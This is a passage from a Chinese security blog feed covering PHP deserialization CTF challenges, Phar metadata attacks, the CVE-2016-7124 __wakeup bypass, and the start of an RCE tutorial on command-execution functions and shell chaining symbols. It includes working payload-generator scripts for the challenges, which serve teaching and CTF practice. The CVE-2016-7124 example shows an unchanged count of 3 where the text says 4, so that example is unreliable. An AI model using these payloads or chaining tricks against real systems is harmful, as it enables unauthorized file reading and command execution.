class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pkshow</span> </span><br><span class="hljs-class"></span>&#123;  <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_name</span>(<span class="hljs-params"></span>)     </span><br><span class="hljs-function">    </span>&#123;          <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Pk very safe^.^&quot;</span>;      <br>    &#125;  <br>&#125; <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span> </span><br><span class="hljs-class"></span>&#123;   <br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cinder</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">    </span>&#123;      <br>        <span class="hljs-variable language_">$this</span>-&gt;cinder = <span class="hljs-keyword">new</span> pkshow;<br>    &#125;  <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function">    </span>&#123;          <br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;cinder))  <br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;cinder-&gt;<span class="hljs-title function_ invoke__">echo_name</span>();      <br>    &#125;  <br>&#125;  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;     <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>; <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_name</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function">    </span>&#123;   <br>        <span class="hljs-variable language_">$this</span>-&gt;openstack = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;docker);<br>        <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="hljs-variable">$heat</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;nova)<br>        &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;./<span class="hljs-subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>))         <br>            &#123;              <br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>); <br>            &#125;  <br>            <span class="hljs-keyword">else</span> <br>            &#123; <br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;keystone lost~&quot;</span>; <br>            &#125;    <br>        &#125;<br>    &#125;  <br>&#125;  <br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]))  <br>&#123;<br>    <span class="hljs-variable">$logData</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$logData</span>; <br>&#125; <br><span class="hljs-keyword">else</span> <br>&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(__file__); <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>首先还是看参数传递：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]))  <br>&#123;<br>    <span class="hljs-comment">// 反序列化一个对象</span><br>    <span class="hljs-variable">$logData</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pks&#x27;</span>]);<br>    <span class="hljs-comment">// 输出了这个对象, 会导致 __toString() 的执行 </span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$logData</span>; <br>&#125; <br></code></pre></td></tr></table></figure><p>这里的 <code>echo</code> 导致了 <code>__toString()</code> 的执行，应该就是通过构造 <code>acp</code> 类的实例反序列化获取 flag。</p><p>不过还是先找危险函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_get_contents</span>() --&gt; <span class="hljs-title function_ invoke__">echo_name</span>() --&gt; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br></code></pre></td></tr></table></figure><p><code>ace</code> 类中有一个 <code>echo_name()</code> 函数可以做到文件读取。</p><p>函数不简单，看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echo_name</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function"></span>&#123;   <span class="hljs-comment">// 反序列化 $docker 给 $this-&gt;openstack</span><br>    <span class="hljs-variable language_">$this</span>-&gt;openstack = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;docker);<br>    <span class="hljs-comment">// $heat 给 $this-&gt;openstack 的 neutron </span><br>    <span class="hljs-comment">// 没找到 $heat</span><br>    <span class="hljs-comment">// neutron 是 class acp 的属性</span><br>    <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron = <span class="hljs-variable">$heat</span>;<br>    <span class="hljs-comment">// class acp 的 neutron 和 nova 强类型比较 </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;neutron === <span class="hljs-variable language_">$this</span>-&gt;openstack-&gt;nova)<br>    &#123;<br>        <span class="hljs-comment">// 条件满足就读取当前文件夹下的某个文件</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;./<span class="hljs-subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>))         <br>        &#123;              <br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>); <br>        &#125;  <br>        <span class="hljs-keyword">else</span> <br>        &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;keystone lost~&quot;</span>; <br>        &#125;    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文件读取的前置条件：</p><ol><li>反序列化后的 <code>$this-&gt;docker</code> 是 <code>acp</code> 的实例</li><li>这个实例的 <code>neutron</code> 和 <code>nova</code> 得相等</li></ol><p>这里的 <code>$heat</code> 变量是未知的，不知道到底是不是一个全局变量，不知道到底有没有在其他PHP文件中定义这个变量。</p><p>这里只能把 <code>$heat</code> 变量当作未被定义的值，才能去进行绕过：</p><ul><li><code>$heat</code> 没有被定义，所以它是一个空值 null</li><li>所以当 <code>$this-&gt;openstack-&gt;nova</code> 也是一个空值时，就可以绕过这个强类型匹配</li></ul><p>这样就简单了，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;     <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>;<br>&#125;<br><span class="hljs-comment">// 不用给 $docker 赋值, 它本身就是一个 null 的值, 然后被反序列化为一个空的 acp 对象, 其中的 $nova 自然也是 null</span><br><span class="hljs-variable">$t</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ace</span>();<br></code></pre></td></tr></table></figure><p>找找哪里调用了了 <code>echo_name()</code> 函数，<code>acp</code> 的 <code>__toString()</code>。</p><p>开头输出了对象，会导致 <code>__toString()</code> 的执行，所以只要构造的是 <code>acp</code> 实例的反序列化，就会执行 <code>__toString()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)      </span><br><span class="hljs-function"></span>&#123;    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;cinder))  <br>        <span class="hljs-comment">// 调用 $cinder 的 echo_name(), 这里的 $cinder 肯定就是 ace 类的实例了</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;cinder-&gt;<span class="hljs-title function_ invoke__">echo_name</span>();      <br>&#125;  <br></code></pre></td></tr></table></figure><p>那么构造 Payload 即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> -&gt; acp.<span class="hljs-title function_ invoke__">__toString</span>() -&gt; ace.<span class="hljs-title function_ invoke__">echo_name</span>() -&gt; <span class="hljs-title function_ invoke__">file_get_contents</span>()<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">acp</span> </span><br><span class="hljs-class"></span>&#123;   <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cinder</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$neutron</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nova</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ace</span></span><br><span class="hljs-class"></span>&#123;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;flag.php&quot;</span>;     <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$openstack</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$docker</span>;<br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">acp</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ace</span>();<br><span class="hljs-variable">$b</span>-&gt;cinder= <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230526224747764.png" alt="image-20230526224747764"></p><h2 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h2><p>当类没有提供魔术方法，或者魔术方法种没有危险的代码，还可以调用 PHP 原生类进行攻击。</p><p>PHP原生类就是在标准PHP库中已经封装好的类，在触发一些魔术方法的时候就会触发这些类，这些类种有一些可以进行目录&#x2F;文件读取、XSS、SSRF 的功能，那么就可以利用它们造成危害。</p><p>可以使用以下脚本获取各个魔术方法可以触发的原生类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) &#123;<br>    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;__destruct&#x27;</span>,<br>            <span class="hljs-string">&#x27;__toString&#x27;</span>,<br>            <span class="hljs-string">&#x27;__wakeup&#x27;</span>,<br>            <span class="hljs-string">&#x27;__call&#x27;</span>,<br>            <span class="hljs-string">&#x27;__callStatic&#x27;</span>,<br>            <span class="hljs-string">&#x27;__get&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set&#x27;</span>,<br>            <span class="hljs-string">&#x27;__isset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__unset&#x27;</span>,<br>            <span class="hljs-string">&#x27;__invoke&#x27;</span>,<br>            <span class="hljs-string">&#x27;__set_state&#x27;</span><br>        ))) &#123;<br>            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">&#x27;::&#x27;</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>利用方式：</p><ul><li><a href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a></li><li><a href="https://www.anquanke.com/post/id/264823#h3-8">https://www.anquanke.com/post/id/264823#h3-8</a></li></ul><h2 id="Phar"><a href="#Phar" class="headerlink" title="Phar"></a>Phar</h2><p>Phar 是 PHP 中的一种打包格式，类似于JAR（Java归档）文件。它允许开发者将多个 PHP 脚本和资源打包到一个文件中，以便于分发和执行。</p><p><code>Phar</code> 文件结构：</p><ul><li><code>stub</code>：Phar 文件标识，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以 <code>__HALT_COMPILER();?&gt; </code> 来结尾，否则phar扩展将无法识别这个文件为phar文件。</li><li><code>manifest</code>：压缩文件的属性等信息，以序列化的形式自定义的 <code>meta-data</code></li><li><code>contents</code>：压缩文件的内容</li><li><code>signature</code>：签名，在文件末尾</li></ul><p>在 PHP 解析 Phar 格式的文件时，内核会调用 <code>phar_parse_metadata()</code> 函数解析 <code>meta-data</code> 数据时，进而调用 <code>php_var_unserialize()</code> 函数对其进行反序列化操作，因此会造成反序列化漏洞。</p><p>利用方式：</p><ul><li><a href="https://tttang.com/archive/1732/">https://tttang.com/archive/1732/</a></li></ul><h2 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h2><p>漏洞概述：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过 <code>__wakeup</code> 的执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 对象属性个数( 对象包含的变量数量 )为 3, 实际个数也为 3</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;apple&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;testb&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;banana&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;*c&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;coconut&quot;</span>;&#125;<br><span class="hljs-comment">// 修改属性个数为 4 即可绕过 __wakeup 执行</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;apple&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;testb&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;banana&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;*c&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;coconut&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>CTF：<a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a></p><p>题目：Web_php_unserialize</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-comment">// 2. 显示文件源码 </span><br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">// 1. flag 在 fl4g.php</span><br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-comment">// 3. GET 参数 var 需要使用 base64 编码</span><br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-comment">// 4. 检测是否存在 [oc]:\d (不区分大小写)</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br>?<br></code></pre></td></tr></table></figure><p>拿 flag 可以通过 <code>__destruct</code> 方法，它可以输出 <code>$file</code> 文件的内容。但是有两个问题：</p><ol><li><code>__wakeup</code> 方法中强制将 <code>$file</code> 设置为 <code>index.php</code></li><li><code>preg_match</code> 匹配序列化字符串中的 <code>[oc]:\d</code></li></ol><p>绕过办法：</p><ol><li><code>CVE-2016-7124</code> 绕过 <code>__wakeup</code> </li><li><code>O:4</code> –&gt; <code>O:+4</code> ( 正四和四相同，又能绕过匹配)</li></ol><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;fl4g.php&#x27;</span>;<br>    &#125;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>, <span class="hljs-string">&#x27;O:+4&#x27;</span>, <span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;:1:&#x27;</span>, <span class="hljs-string">&#x27;:2:&#x27;</span>, <span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>WEB漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE 漏洞</title>
    <link href="/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/RCE/"/>
    <url>/2023/05/28/WEB%E6%BC%8F%E6%B4%9E/RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="RCE-漏洞"><a href="#RCE-漏洞" class="headerlink" title="RCE 漏洞"></a>RCE 漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>远程代码、命令执行漏洞又叫 RCE 漏洞，其是指攻击者可直接在服务器上执行代码或系统命令。</p><p>该漏洞的形式有很多，比如文件包含漏洞可导致远程代码执行，反序列化漏洞导致远程命令执行，这最终都可以算作 RCE 漏洞。</p><p>不过这里只单单讲一下，因为后端提供执行代码、命令的服务而导致的 RCE，其实就是后端使用了代码执行、命令执行的函数，函数参数用户可控且过滤的不严谨，导致可执行任意代码或命令。</p><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ul><li>远程代码执行</li><li>远程命令执行</li></ul><h2 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td><code>system(args)</code></td><td>有回显,输出并返回最后一行shell结果</td></tr><tr><td><code>passthru(args)</code></td><td>有回显,显示原始输出</td></tr><tr><td><code>exec(args)</code></td><td>不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面</td></tr><tr><td><code>shell_exec(args)</code></td><td>无回显-必须输出</td></tr><tr><td><code>popen(command,mode)</code></td><td>无回显</td></tr></tbody></table><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><ul><li><code>eval</code></li><li><code>assert</code></li><li><code>preg_replace</code></li><li><code>create_function</code></li><li><code>array_map</code></li><li><code>eval</code></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这两个漏洞的利用方式其实可以看做一种，因为代码执行也可以使用命令执行的函数来达到命令执行的效果。</p><p>区分其分类的只是操作漏洞的函数不同。</p><h3 id="命令链接符"><a href="#命令链接符" class="headerlink" title="命令链接符"></a>命令链接符</h3><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><table><thead><tr><th align="center">符号</th><th align="center"></th><th align="left">作用</th></tr></thead><tbody><tr><td align="center">分号</td><td align="center">;</td><td align="left">先执行前面的命令再执行后面的命令。</td></tr><tr><td align="center">管道符</td><td align="center">|</td><td align="left">显示后面的执行结果。</td></tr><tr><td align="center">后台任务符号</td><td align="center">&amp;</td><td align="left">先执行前面的命令再执行后面的命令。</td></tr><tr><td align="center">逻辑与</td><td align="center">&amp;&amp;</td><td align="left">前面的命令执行成功后，它后面的命令才被执行。</td></tr><tr><td align="center">逻辑或</td><td align="center">||</td><td align="left">只有 || 前面的命令执行失败后，它后面的命令才被执行。</td></tr><tr><td align="center">反引号</td><td align="center">&#96;</td><td align="left">当一个命令被解析时，它首先会执行反引号之间的操作。&#96;</td></tr><tr><td align="center">$(command)</td><td align="center">$(command)</td><td align="left">这是命令替换的不同符号。当反引号被过滤或编码时，可能会更有效。</td></tr></tbody></table><h4 id="windows"><a href="#windows" class="headerlink" 